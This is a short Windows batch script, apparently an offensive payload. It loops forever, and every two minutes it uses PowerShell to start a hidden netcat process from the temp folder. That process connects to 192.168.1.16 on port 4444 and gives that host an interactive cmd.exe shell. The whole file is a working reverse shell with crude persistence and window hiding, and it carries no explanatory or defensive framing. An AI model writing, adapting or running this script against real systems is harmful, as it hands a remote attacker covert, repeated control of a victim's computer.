@echo off
:loop
    powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden"
    timeout /t 120 >nul
goto loop
